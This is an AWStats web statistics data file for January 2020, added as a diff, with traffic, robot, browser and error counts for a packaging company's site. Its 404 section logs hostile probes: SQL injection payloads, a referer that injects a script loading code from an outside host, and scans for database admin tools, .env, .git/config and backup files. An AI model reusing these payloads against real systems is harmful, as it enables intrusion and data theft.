@@ -1,0 +1,1326 @@
+AWSTATS DATA FILE 6.9 (build 1.925)
+# If you remove this file, all statistics for date 202001 will be lost/reset.
+
+# Position (offset in bytes) in this file of beginning of each section for
+# direct I/O access. If you made changes somewhere in this file, you should
+# also remove completely the MAP section (AWStats will rewrite it at next
+# update).
+BEGIN_MAP 27
+POS_GENERAL 1864                
+POS_TIME 2553                
+POS_VISITOR 28638               
+POS_DAY 44819               
+POS_DOMAIN 3495                
+POS_LOGIN 3730                
+POS_ROBOT 3885                
+POS_WORMS 4610                
+POS_EMAILSENDER 4741                
+POS_EMAILRECEIVER 4884                
+POS_SESSION 45723               
+POS_SIDER 45935               
+POS_FILETYPES 5019                
+POS_OS 5231                
+POS_BROWSER 5398                
+POS_SCREENSIZE 5938                
+POS_UNKNOWNREFERER 6012                
+POS_UNKNOWNREFERERBROWSER 6863                
+POS_ORIGIN 6996                
+POS_SEREFERRALS 7140                
+POS_PAGEREFS 7307                
+POS_SEARCHWORDS 7511                
+POS_KEYWORDS 7663                
+POS_MISC 2217                
+POS_ERRORS 7722                
+POS_CLUSTER 3586                
+POS_SIDER_404 7873                
+END_MAP
+
+# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value
+# FirstTime   = Date of first visit for history file
+# LastTime    = Date of last visit for history file
+# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped
+# TotalVisits = Number of visits
+# TotalUnique = Number of unique visitors
+# MonthHostsKnown   = Number of hosts known
+# MonthHostsUnKnown = Number of hosts unknown
+BEGIN_GENERAL 8
+LastLine 20200201000913 21104 5598149 26881421434
+FirstTime 20200101004320
+LastTime 20200131212018
+LastUpdate 20200201022642 21104 20756 347 0 0
+TotalVisits 534                 
+TotalUnique 373                 
+MonthHostsKnown 0                   
+MonthHostsUnknown 423                 
+END_GENERAL
+
+# Misc ID - Pages - Hits - Bandwidth
+BEGIN_MISC 10
+QuickTimeSupport 0 0 0
+JavaEnabled 0 0 0
+JavascriptDisabled 0 0 0
+PDFSupport 0 0 0
+WindowsMediaPlayerSupport 0 0 0
+AddToFavourites 0 1 0
+RealPlayerSupport 0 0 0
+TotalMisc 0 0 0
+DirectorSupport 0 0 0
+FlashSupport 0 0 0
+END_MISC
+
+# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth
+BEGIN_TIME 24
+0 23 99 4417740 76 113 2322972
+1 48 438 15813481 184 225 4524966
+2 49 214 5738440 119 145 2469748
+3 283 412 11818816 106 125 2580946
+4 36 46 1126830 93 119 1844435
+5 23 108 3631887 124 148 2327202
+6 38 467 15313869 57 121 3757092
+7 91 2278 67029978 82 131 2854372
+8 14 221 9313810 74 110 1573945
+9 49 573 23949810 60 91 1769223
+10 99 515 19981532 286 334 4370360
+11 577 1174 40757061 3735 3766 59090106
+12 32 97 3434456 84 132 1867757
+13 324 868 31172975 108 180 3602834
+14 155 446 15539129 388 434 9815997
+15 62 582 24148079 294 316 2633065
+16 79 1915 65787337 419 495 2663467
+17 39 56 1679438 94 137 2132572
+18 24 115 5429904 97 139 2775500
+19 62 136 4223646 60 115 2049353
+20 48 143 5137186 130 148 3489729
+21 87 436 15320887 305 351 5300418
+22 99 292 9550265 147 192 4559012
+23 285 958 37799170 232 328 7524109
+END_TIME
+
+# Domain - Pages - Hits - Bandwidth
+# The 10 first Pages must be first (order not required for others)
+BEGIN_DOMAIN 1
+ip 2626 12589 438115726
+END_DOMAIN
+
+# Cluster ID - Pages - Hits - Bandwidth
+BEGIN_CLUSTER 0
+END_CLUSTER
+
+# Login - Pages - Hits - Bandwidth - Last visit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_LOGIN 0
+END_LOGIN
+
+# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt
+# The 10 first Hits must be first (order not required for others)
+BEGIN_ROBOT 16
+infobot 949 20487603 20200131203842 127
+python 439 2360803 20200130153614 14
+googlebot 425 11283046 20200131175327 62
+robot 367 8311862 20200131082431 58
+bot[+:,\.\;\/\\-] 344 8830081 20200131224028 65
+crawl 307 7832699 20200115154434 1
+cfnetwork 170 0 20200131160105 0
+baiduspider 141 6249695 20200128105813 0
+msnbot 103 3008964 20200131083916 11
+yandex 95 1277210 20200131052219 45
+core 2 169171 20200130151929 0
+no_user_agent 60 3209205 20200119010642 2
+spider 24 1076777 20200124212440 0
+mail\.ru 2 28598 20200128233014 1
+unknown 35 0 20200130001548 35
+wordpress 1 19263 20200131101447 0
+END_ROBOT
+
+# Worm ID - Hits - Bandwidth - Last visit
+# The 5 first Hits must be first (order not required for others)
+BEGIN_WORMS 0
+END_WORMS
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first Hits must be first (order not required for others)
+BEGIN_EMAILSENDER 0
+END_EMAILSENDER
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first hits must be first (order not required for others)
+BEGIN_EMAILRECEIVER 0
+END_EMAILRECEIVER
+
+# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression
+BEGIN_FILETYPES 8
+css 1689 103523967 0 0
+png 3266 50810522 0 0
+txt 4 0 0 0
+woff 37 285344 0 0
+php 1960 48348731 0 0
+html 625 12208344 0 0
+js 3043 81223221 0 0
+jpg 1965 141715597 0 0
+END_FILETYPES
+
+# OS ID - Hits
+BEGIN_OS 11
+macintosh 2
+winlong 655
+winxp 77
+win2000 1
+winnt 5632
+winvista 63
+linux 1317
+macosx 3951
+linuxcentos 2
+Unknown 128
+win2008 761
+END_OS
+
+# Browser ID - Hits
+BEGIN_BROWSER 35
+firefox71.0 347
+firefox28.0 51
+msie6.0 9
+firefox66.0 1
+firefox10.0 3
+chrome 7214
+firefox3.0.1 2
+firefox52.0 740
+firefox34.0 137
+firefox63.0 760
+msie8.0 61
+firefox70.0 1
+firefox62.0 219
+firefox64.0 1
+firefox59.0 1
+firefox65.0 11
+msie9.0 3
+Unknown 20
+firefox3.0.2 2
+firefox50.0 2
+firefox48.0 10
+firefox72.0 439
+opera 14
+firefox69.0 2
+firefox56.0 10
+firefox47.0 4
+firefox45.0 2
+firefox68.0 3
+mozilla 315
+firefox45.62.25 1
+netscape5.0 22
+msie10.0 1
+firefox3.0.10 4
+safari 2175
+firefox3.6.13 2
+END_BROWSER
+
+# Screen size - Hits
+BEGIN_SCREENSIZE 0
+END_SCREENSIZE
+
+# Unknown referer OS - Last visit date
+BEGIN_UNKNOWNREFERER 10
+\ 20200101165129
+Mozilla/5.0_AppleWebKit/537.36_(KHTML,_like_Gecko)_Chrome/55.0.2883.95_Safari/537.36 20200109140234
+Mozilla/5.0_(compatible;_Daum/4.1;__http://cs.daum.net/faq/15/4118.html?faqId=28966) 20200127195602
+Mozilla/5.0_(compatible;_CloudFlare-AlwaysOnline/1.0;_http://www.cloudflare.com/always-online) 20200122063230
+Opera/9.80_(J2ME/MIDP;_Opera_Mini/4.1.11355/26.1424;_U;_ru)_Presto/2.8.119_Version/10.54 20200115223418
+Mozilla/5.0_(compatible;_Yahoo_Ad_monitoring;_https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html)_yahoo.adquality.lwd.desktop/1523560315-0 20200131101442
+Go-http-client/1.1 20200131212018
+Mozilla/5.0_(compatible;_Dataprovider.com) 20200113131858
+Mozilla/5.0_(compatible;_ips-agent) 20200129194547
+Opera/9.27 20200119010638
+END_UNKNOWNREFERER
+
+# Unknown referer Browser - Last visit date
+BEGIN_UNKNOWNREFERERBROWSER 2
+\ 20200101165129
+Go-http-client/1.1 20200131212018
+END_UNKNOWNREFERERBROWSER
+
+# Origin - Pages - Hits 
+BEGIN_ORIGIN 6
+From0 2182 2429
+From1 8 8
+From2 40 45
+From3 7 7
+From4 389 10100
+From5 0 0
+END_ORIGIN
+
+# Search engine referers ID - Pages - Hits
+BEGIN_SEREFERRALS 2
+google 39 44
+baidu 1 1
+END_SEREFERRALS
+
+# External page referers - Pages - Hits
+# The 10 first Pages must be first (order not required for others)
+BEGIN_PAGEREFS 2
+http://progressive-seo.com 6 6
+https://www.bing.com 1 1
+END_PAGEREFS
+
+# Search keyphrases - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_SEARCHWORDS 0
+END_SEARCHWORDS
+
+# Search keywords - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_KEYWORDS 0
+END_KEYWORDS
+
+# Errors - Hits - Bandwidth
+BEGIN_ERRORS 6
+302 10 2560
+206 267 657998
+409 1 83
+405 11 2690
+406 2 548
+404 4640 63090324
+END_ERRORS
+
+# URL with 404 errors - Hits - Last URL referer
+BEGIN_SIDER_404 553
+/adminer-3.6.3-mysql-en.php 1 -
+/wp-content/plugins/delucks-seo/modules/professional/breadcrumbs/assets/css/frontend.css 1 -
+//huoshan.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/adminer-3.7.0.php 1 -
+/admin/ckfinder/core/connector/asp/connector.asp 1 http://www.act-packaging.com/admin/ckfinder/core/connector/asp/connector.asp
+/adminer-4.0.2-cs.php 1 -
+/adminer-4.3.0-mysql-cs.php 1 -
+/adminer-4.2.1-cs.php 1 -
+/adminer-3.6.4-mysql.php 1 -
+/xmlrpc.php 1 -
+/%20or%20(1,2)=(select*from(select%20name_const(CHAR(110,105,105,106,105,114,67,70,112,105),1),name_const(CHAR(110,105,105,106,105,114,67,70,112,105),1))a)%20--%20and%201%3D1 1 -
+/adminer-4.2.2-mysql-en.php 1 -
+/statics/js/admin_common.js 12 -
+/phpMyAdmin/print.css 2 -
+/adminer-4.7.2-mysql-cs.php 1 -
+/adminer-3.4.0-cs.php 1 -
+/adminer-4.7.3-cs.php 1 -
+/adminer-4.2.3-mysql.php 1 -
+/adminer-3.3.0-mysql.php 1 -
+//wp-login.php 7 \"><script%20type=text/javascript%20src='https://statistic.admarketlocation.com/hos
+/adminer-3.3.2-mysql-cs.php 1 -
+/adminer-4.6.3-cs.php 1 -
+/adminer-4.0.2-mysql.php 1 -
+/adminer-4.0.0-mysql.php 1 -
+/adminer-4.7.0-mysql-cs.php 1 -
+/adminer-4.3.1-mysql.php 1 -
+/2018//wp-admin/install.php 1 -
+/adminer-4.2.4-mysql.php 1 -
+/administrator/ 1 -
+/adminer-3.3.1-mysql-cs.php 1 -
+/adminer-3.6.4-mysql-en.php 1 -
+/adminer-3.2.2-en.php 1 -
+/d/txt/test.txt 4 http://www.act-packaging.com/d/txt/test.txt
+/adminer-4.2.0-mysql-cs.php 1 -
+/adminer-3.7.0-mysql-en.php 1 -
+/adminer-3.2.2-mysql-en.php 1 -
+/product/Packaging-Paper-%20Box.html 1 -
+/adminer-4.1.0-mysql-cs.php 1 -
+/adminer-3.6.3-mysql-cs.php 1 -
+/adminer-3.6.1-cs.php 1 -
+/js/common.js 5 http://www.act-packaging.com/js/common.js
+/service/ 1 -
+/adminer-4.6.0-mysql-en.php 1 -
+/adminer-4.7.2-mysql.php 1 -
+/data/cache/hy.php 3 -
+/adminer-3.6.0-mysql-cs.php 1 -
+/adminer-3.3.0.php 1 -
+/ad.php 1 -
+/news 1 -
+/adminer-3.3.1.php 1 -
+//zz.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/public/admin/ueditor/dialogs/internal.js 2 http://www.act-packaging.com/public/admin/ueditor/dialogs/internal.js
+/.bitcoin/ 1 -
+/public/simpleboot/css/simplebootadmin.css 13 -
+//mjx.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/adminer-4.4.0-cs.php 1 -
+/%27%20or%20(1,2)=(select*from(select%20name_const(CHAR(110,105,105,106,105,114,67,70,112,105),1),name_const(CHAR(110,105,105,106,105,114,67,70,112,105),1))a)%20--%20%27x%27=%27x 1 -
+/backup.sql 1 -
+/adminer-4.6.3-en.php 1 -
+/adminer-4.2.2-cs.php 1 -
+/adminer-4.7.0-cs.php 1 -
+/product/Folding-box.html 1 -
+/adminer-4.2.4-mysql-en.php 1 -
+/adminer-4.4.0-mysql.php 1 -
+/adminer-4.2.1-mysql.php 1 -
+/adminer-4.6.0-mysql-cs.php 1 -
+/adminer-4.4.0-en.php 1 -
+/adminer-4.2.0-en.php 1 -
+/product/166.html 1 -
+/adminer-4.2.4-en.php 1 -
+/adminer-3.4.0-mysql-cs.php 1 -
+//ueditor/net/controller.ashx 1 http://www.act-packaging.com//ueditor/net/controller.ashx
+/adminer-3.6.2-cs.php 1 -
+/manager/login.php 3 -
+/product/folding-card-paper-box.html 1 -
+/adminer-4.7.1.php 1 -
+/adminer-3.0.1-mysql-en.php 1 -
+//dede_ht/login.php 1 -
+/adminer-3.5.0-mysql-en.php 1 -
+/product/lip-balm-paper-box.html 1 -
+/adminer-4.5.0-cs.php 1 -
+/adminer-4.2.0-mysql.php 1 -
+/adminer-3.3.3-cs.php 1 -
+/adminer-3.2.1-mysql.php 1 -
+/wp-admin/admin-post.php 15 -
+/service 1 -
+/wp-content/plugins/wpshopify/dist/public.min.css 1 -
+/dede/login.php 2 -
+/temp//wp-admin/install.php 1 -
+/product/237.html 1 -
+/adminer-3.1.0-cs.php 1 -
+/adminer-3.6.2-en.php 1 -
+/).on( 2 -
+/adminer-4.0.1.php 1 -
+/adminer-3.7.1-mysql-en.php 1 -
+/adminer-3.3.4-en.php 1 -
+/adminer-4.6.1-en.php 1 -
+/adminer-3.6.4-mysql-cs.php 1 -
+/news/Die-cut%20making%20machine.html 1 -
+/product/Packaging-folding-Box-with-Window.html 1 -
+/adminer-3.7.0-mysql.php 1 -
+/wp-content/plugins/fb-messenger-live-chat/assets/js/main.js 1 -
+/adminer-4.2.4-mysql-cs.php 1 -
+/adminer-3.3.1-mysql-en.php 1 -
+/adminer-3.6.1-en.php 1 -
+/\"%20and%20\"x\"%3D\"x 1 -
+/adminer-4.7.1-mysql-en.php 1 -
+/wp-content/plugins/easy2map/scripts/jquery.xml2json.js 1 -
+/adminer-3.7.1-cs.php 1 -
+/adminer-3.2.1-en.php 1 -
+/javascript:void(0) 1 -
+/adminer-4.2.5-mysql-en.php 1 -
+/service/How-to-Place-Orders.html 1 -
+/keditor/themes/default/default.css 2 http://www.act-packaging.com/keditor/themes/default/default.css
+/%22%20and%20%22x%22%3D%22y 1 -
+//xiaoxia.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/adminer-3.6.3-cs.php 1 -
+/product/fbx9.html 1 -
+/adminer-4.3.0-mysql.php 1 -
+/templates/system/css/system.css 2 -
+/adminer-3.3.4-cs.php 1 -
+/e/admin/index.php 4 http://www.act-packaging.com/e/admin/index.php
+/adminer-4.2.2-mysql-cs.php 1 -
+/wp-config.php~ 1 -
+/wp/ 2 -
+/adminer-3.6.1-mysql-en.php 1 -
+/administrator/help/en-GB/toc.json 1 -
+/wp-content/plugins/ithemes-sync/js/settings-page.js 1 -
+/product/kraft-paper-packaging-box.html 1 -
+/ewebedit/upload.asp 2 http://act-packaging.com/ewebedit/upload.asp
+/adminer-4.0.3.php 1 -
+/admin/themes/default/default.css 1 http://www.act-packaging.com/admin/themes/default/default.css
+/product/wine%20gift%20paper%20box.html 1 -
+/adminer-3.2.2-cs.php 1 -
+/adminer-4.0.0-mysql-en.php 1 -
+/edit/dialogs/internal.js 2 http://act-packaging.com/edit/dialogs/internal.js
+/news/56.html 1 -
+/adminer-4.2.1-en.php 1 -
+/wp-content/plugins/smart-google-code-inserter/screenshot1.jpg 1 -
+/wp-content/plugins/wpematico/app/js/wpe_hooks.js 1 -
+/js/upimg/dialog.js 2 http://act-packaging.com/js/upimg/dialog.js
+//dede_houtai/login.php 1 -
+/product/Metallic-Color-Packaging-Box.html 1 -
+/installer.php 1 -
+/adminer-3.2.0-mysql.php 1 -
+/js/kcfinder/browse.php 1 -
+/adminer-4.7.2-mysql-en.php 1 -
+/adminer-3.1.0.php 1 -
+/wp-content/plugins/hybrid-composer/style.css 1 -
+/news/61.html 1 -
+//hmseo.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/adminer-4.2.4-cs.php 1 -
+/adminer-4.0.3-mysql-cs.php 1 -
+/router.php 5 -
+/adminer-4.5.0-mysql.php 1 -
+/admin/ewebedit/upload.asp 1 http://www.act-packaging.com/admin/ewebedit/upload.asp
+/adminer-3.7.0-en.php 1 -
+/adminer-4.7.1-en.php 1 -
+/pma.php 1 -
+/adminer-3.6.3-mysql.php 1 -
+/admindede/login.php 3 -
+/%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(110,105,105,106,105,114,67,70,112,105),1),name_const(CHAR(110,105,105,106,105,114,67,70,112,105),1))a)%20--%20%22x%22=%22x 1 -
+/southidceditor/dialog/dialog.js 2 http://act-packaging.com/southidceditor/dialog/dialog.js
+/adminer-4.7.3-en.php 1 -
+/product/Speedo-paper-box.html 1 -
+/' 1 -
+/adminer-3.3.3-mysql-cs.php 1 -
+//taisui.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/admin/editubb/asp/upload.asp 1 http://www.act-packaging.com/admin/editubb/asp/upload.asp
+/adminer-3.3.2-mysql-en.php 1 -
+/adminer-4.0.1-cs.php 1 -
+/%27%20and%20%27x%27%3D%27y 1 -
+/adminer-4.6.0-mysql.php 1 -
+/adminer-4.6.0.php 1 -
+/adminer-4.3.0-cs.php 1 -
+/adminer-3.1.0-mysql-cs.php 1 -
+/adminer-4.0.3-cs.php 1 -
+/adminer-4.0.3-mysql.php 1 -
+/product/Round-box.html 1 -
+/misc/ajax.js 1 -
+/editor/dialogs/internal.js 2 http://act-packaging.com/editor/dialogs/internal.js
+/admin/webeditor/dialog/dialog.js 2 http://www.act-packaging.com/admin/webeditor/dialog/dialog.js
+/adminer-3.3.4-mysql.php 1 -
+/adminer-4.5.0-mysql-en.php 1 -
+/adminer-3.5.1-mysql-cs.php 1 -
+/c_feedback/index.asp 1 http://www.act-packaging.com/c_feedback/index.asp
+/adminer-3.6.2-mysql-en.php 1 -
+/FCKeditor/fckconfig.js 4 http://www.act-packaging.com/FCKeditor/fckconfig.js
+/adminer-3.0.0-cs.php 1 -
+/mybeifen/index.php 1 http://www.act-packaging.com/mybeifen/index.php
+/adminer-4.7.0-mysql-en.php 1 -
+/adminer 1 -
+/database/print.css 2 -
+/adminer-4.1.0-mysql-en.php 1 -
+/adminer-3.6.3.php 1 -
+/product/CORRUGATED-BOX.html 1 -
+/wp-admin/admin-ajax.php 11 -
+/webmanage/ueditor/dialogs/internal.js 1 http://www.act-packaging.com/webmanage/ueditor/dialogs/internal.js
+/adminer-4.5.0-mysql-cs.php 1 -
+/webeditor/dialog/dialog.js 1 http://act-packaging.com/webeditor/dialog/dialog.js
+//uploads/1.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/themes/default/default.css 1 http://www.act-packaging.com/themes/default/default.css
+/db.php 1 -
+/news/51.html 1 -
+/skin/default/style.css 1 http://act-packaging.com/skin/default/style.css
+/wp-json/wpshopify/v1/settings 1 -
+/editor/kindeditor/themes/default/default.css 2 http://www.act-packaging.com/editor/kindeditor/themes/default/default.css
+/a.php 1 -
+/js/comm.js 7 -
+/webedit/dialog/dialog.js 2 http://www.act-packaging.com/webedit/dialog/dialog.js
+/adminer-4.6.1-mysql-en.php 1 -
+/adminer-3.2.0-cs.php 1 -
+/adminer-3.2.1-mysql-cs.php 1 -
+/adminer-3.6.4.php 1 -
+/news/2012-HK-International-Printing 1 -
+/adminer-4.7.2.php 1 -
+/adminer-3.0.0.php 1 -
+/adminer-4.7.1-mysql.php 1 -
+//yu.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/admina/login.php 1 http://www.act-packaging.com/admina/login.php
+/adminer-3.3.3-en.php 1 -
+/%27%20and%20%27x%27%3D%27x 1 -
+/sitemap.xml 3 -
+/product/index35.html 1 -
+/adminer-4.2.3-mysql-cs.php 1 -
+/adminer-3.3.0-cs.php 1 -
+/install/index.php.bak 6 -
+/dup-installer/main.installer.php 1 -
+/old//wp-admin/install.php 1 -
+/adminer-4.6.2-cs.php 1 -
+/blog//wp-admin/install.php 1 -
+/adminer-4.0.1-en.php 1 -
+/wp-admin/wp-login.php 7 \"><script%20type=text/javascript%20src='https://statistic.admarketlocation.com/hos
+/adminer-4.0.2-en.php 1 -
+//member/editor/kindeditor/plugins/emoticons/images/0.gif/1.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/wordpress//wp-admin/install.php 1 -
+/product/Corrugated-box.html 2 -
+/99999%27%20union%20select%20unhex(hex(version()))%20--%20%27x%27=%27x 1 -
+/.well-known/security.txt 2 -
+/wp1//wp-admin/install.php 1 -
+/adminer-3.5.1-cs.php 1 -
+/about/Organizational-structure.html 1 -
+/wp-content/uploads/adminer.php 1 -
+/adminer-4.0.2-mysql-cs.php 1 -
+/adminer-3.2.0.php 1 -
+/adminer-3.6.0-mysql-en.php 1 -
+/adminer-4.4.0.php 1 -
+/adminer-3.5.1-en.php 1 -
+/portal//wp-admin/install.php 1 -
+/adminer-4.3.1.php 1 -
+/SinaEditor/Edit/editor/editor.js 1 http://www.act-packaging.com/SinaEditor/Edit/editor/editor.js
+/adminer-3.7.0-mysql-cs.php 1 -
+/adminer-4.6.3-mysql-cs.php 1 -
+/adminer-4.2.2-mysql.php 1 -
+/.well-known/assetlinks.json 13 -
+/wp2//wp-admin/install.php 1 -
+/adminer-4.2.2-en.php 1 -
+/config/AspCms_config.asp 1 -
+/.env 4 -
+/connect.php 1 -
+/service/index.html 1 -
+/sitemap.html 3 -
+//install/index.php.bak 2 -
+/adminer-3.3.3-mysql.php 1 -
+/htaccess.txt 1 -
+/wp-content/plugins/rich-reviews/css/rich-reviews.css 1 -
+/adminer-4.7.2-en.php 1 -
+/factory 1 -
+//nuan.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/product/Box.html 1 -
+//statics/css/crop.css 8 -
+/adminer-3.2.0-mysql-en.php 1 -
+/product 1 -
+/public/router.php 7 -
+/adminer-3.5.1-mysql.php 1 -
+/about/index.html 1 -
+/adminer-3.4.0-en.php 1 -
+//python.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/mysql/index.php 2 http://www.act-packaging.com/mysql/index.php
+/adminer-4.6.2-mysql.php 1 -
+/adminer-3.0.0-mysql-cs.php 1 -
+/adminer-3.5.1-mysql-en.php 1 -
+/adminer-4.4.0-mysql-en.php 1 -
+/adminer-3.3.2-cs.php 1 -
+/index.php 3688 -
+//blog/ 2 http://www.act-packaging.com/
+/adminer-3.1.0-mysql-en.php 1 -
+/product/cbx15.html 1 -
+/wordpress/ 2 -
+/admin.php 5 http://www.act-packaging.com/admin.php
+/product/Set-up-box-Lid-Base-box.html 1 -
+/adminer-3.0.1-cs.php 1 -
+/999999.1%20union%20select%20unhex(hex(version()))%20--%20and%201%3D1 1 -
+/adminer-3.2.1-cs.php 1 -
+/product/underwear-packing-box.html 1 -
+/adminer-3.5.0-mysql-cs.php 1 -
+/adminer-3.1.0-mysql.php 1 -
+/2019//wp-admin/install.php 1 -
+/adminer-4.0.0-mysql-cs.php 1 -
+/phpmyadmin/print.css 2 -
+/tmp//wp-admin/install.php 1 -
+/fckeditor/editor/filemanager/connectors/php/upload.php 2 -
+/adminer-3.3.4-mysql-en.php 1 -
+/news/57.html 1 -
+/adminer-4.2.3-en.php 1 -
+/\" 1 -
+/adminer-4.6.1.php 1 -
+/drupal/README.txt 1 -
+/product/Gift-box.html 1 -
+/adminer-4.7.3-mysql-en.php 1 -
+//woshimengmei.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/adminer-4.6.0-cs.php 1 -
+/adminer-3.2.1-mysql-en.php 1 -
+/adminer-4.0.3-en.php 1 -
+/adminer-3.3.2-en.php 1 -
+/adminer-3.1.0-en.php 1 -
+/wp-content/plugins/wp-inventory-manager/themes/css/default-theme.css 1 -
+/wp-login.php 7 -
+//utility/convert/index.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/adminer-3.3.1-cs.php 1 -
+/wp-content/plugins/wp-private-content-plus/css/wppcp-front.css 1 -
+/adminer-3.6.0.php 1 -
+/download 1 -
+/ueditor/net/controller.ashx 4 http://www.act-packaging.com/ueditor/net/controller.ashx
+/assets//wp-admin/install.php 1 -
+/product/hinged%20paper%20box.html 1 -
+/adminer-3.5.0-cs.php 1 -
+/wp-admin 1 \"><script%20type=text/javascript%20src='https://statistic.admarketlocation.com/hos
+//public/simpleboot/css/simplebootadmin.css 5 -
+/adminer-3.4.0.php 1 -
+/adminer-4.7.1-mysql-cs.php 1 -
+/adminer-3.3.2-mysql.php 1 -
+/adminer-4.2.0.php 1 -
+/adminer-4.6.0-en.php 1 -
+/adminer-3.3.1-en.php 1 -
+/ads.txt 2 -
+/adminer-3.7.0-cs.php 1 -
+/adminer-4.2.5-en.php 1 -
+/wp-content/plugins/yuzo-related-post/assets/js/admin.js 1 -
+/adminer-4.5.0.php 1 -
+/product/Rigid-Paper-box.html 1 -
+/test/README.txt 1 -
+/adminer-3.0.1-mysql.php 1 -
+/adminer-4.2.1-mysql-cs.php 1 -
+/adminer-3.0.1.php 1 -
+/adminer-4.2.1.php 1 -
+//FCKeditor/fckconfig.js 1 http://www.act-packaging.com//FCKeditor/fckconfig.js
+/adm.php 1 -
+/service/Sample-Policy.html 1 -
+/adminer-4.2.4.php 1 -
+/adminer-4.3.0-mysql-en.php 1 -
+/adminer-3.7.1-mysql-cs.php 1 -
+/adminer-4.0.1-mysql-cs.php 1 -
+/wp-content/uploads/file-manager/log.txt 1 -
+/adminer-3.3.0-mysql-cs.php 1 -
+/feed/ 1 -
+/adminer-3.3.4-mysql-cs.php 1 -
+/adminer-3.6.1-mysql.php 1 -
+/adminer-4.7.1-cs.php 1 -
+/adminer-4.7.0-mysql.php 1 -
+//ll.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/adminer-3.5.1.php 1 -
+/.git/config 1 -
+/adminer-4.3.0.php 1 -
+/adminer-3.3.3-mysql-en.php 1 -
+/product/Packing-Paper-Box.html 1 -
+/adminer-3.0.0-mysql.php 1 -
+//dp.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/product/index.html 2 -
+/wp-includes/js/jquery/jquery.js 1 -
+/adminer-3.6.2-mysql-cs.php 1 -
+/adminer-3.6.2.php 1 -
+//xz.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/act-packaging.sql 1 -
+/public/static/.gitignore 2 -
+//public/js/image.js 5 -
+/js/tc.js 7 -
+/edit/themes/default/default.css 1 http://www.act-packaging.com/edit/themes/default/default.css
+/adminer-3.5.0-en.php 1 -
+/product/Greeting-Card-Envelop.html 1 -
+/adminer-4.6.1-mysql.php 1 -
+/admin/images/cal_date_over.gif 2 -
+/v2//wp-admin/install.php 1 -
+/wp-content/plugins/adminer/inc/editor/index.php 1 -
+/include/dialog/select_soft_post.php 1 -
+/adminer-4.5.0-en.php 1 -
+/adminer-4.0.3-mysql-en.php 1 -
+/wp-content/plugins/yellow-pencil-visual-theme-customizer/js/yellow-pencil.js 1 -
+/site/README.txt 1 -
+/adminer-3.6.0-en.php 1 -
+/adminer-3.4.0-mysql-en.php 1 -
+/adminer-3.2.2-mysql.php 1 -
+/adminer-4.6.3-mysql-en.php 1 -
+/cms//wp-admin/install.php 1 -
+/adminer-4.3.1-mysql-en.php 1 -
+/public/admin/kindeditor/themes/default/default.css 1 http://act-packaging.com/public/admin/kindeditor/themes/default/default.css
+/blog/ 3 -
+/adminer-3.0.0-mysql-en.php 1 -
+/site//wp-admin/install.php 1 -
+//yuyang.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/adminer-4.0.0-cs.php 1 -
+/adminer-3.0.1-mysql-cs.php 1 -
+/about/Mission-Value.html 1 -
+//meijianxue.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/upload/index.php 2 http://www.act-packaging.com/upload/index.php
+/adminer-3.0.0-en.php 1 -
+/public/ui/v1/js/sea.js 7 -
+/wangdafa 13 -
+/product/165.html 1 -
+//dede3/login.php 1 -
+/adminer-3.0.1-en.php 1 -
+/new//wp-admin/install.php 1 -
+/adminer-4.7.3.php 1 -
+/adminer-3.6.4-en.php 1 -
+/myadmin/print.css 2 -
+//hanyan.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/wp//wp-admin/install.php 1 -
+/app/etc/local.xml 1 -
+//news/html/ 2 http://www.act-packaging.com//news/html/
+/mysql.php 1 -
+/adminer-4.7.0-en.php 1 -
+/web//wp-admin/install.php 1 -
+/adminer-3.2.0-mysql-cs.php 1 -
+/adminer-3.3.1-mysql.php 1 -
+/htadmin/login.php 3 -
+/adminer-4.3.0-en.php 1 -
+/wp-content/plugins/visualizer/js/media.js 1 -
+//doudou.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+//coonig.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/adminer-4.6.2.php 1 -
+/adminer-3.7.1.php 1 -
+/adminer-3.6.0-mysql.php 1 -
+/adminer-4.2.0-cs.php 1 -
+/upload/2014-01-23/20140123215717990.pdf 1 -
+/product/LID-BASE-BOX.html 1 -
+/adminer-4.6.1-mysql-cs.php 1 -
+//index.php 2 -
+/adminer-4.7.2-cs.php 1 -
+/js/jquery.easing.1.3.js 130 -
+/static/.gitignore 12 -
+/product/167.html 1 -
+/mailto:info@act-packaging.com 1 -
+/adminer-4.2.3-mysql-en.php 1 -
+/bk//wp-admin/install.php 1 -
+/_adminer 1 -
+/99999%22%20union%20select%20unhex(hex(version()))%20--%20%22x%22=%22x 1 -
+/v1//wp-admin/install.php 1 -
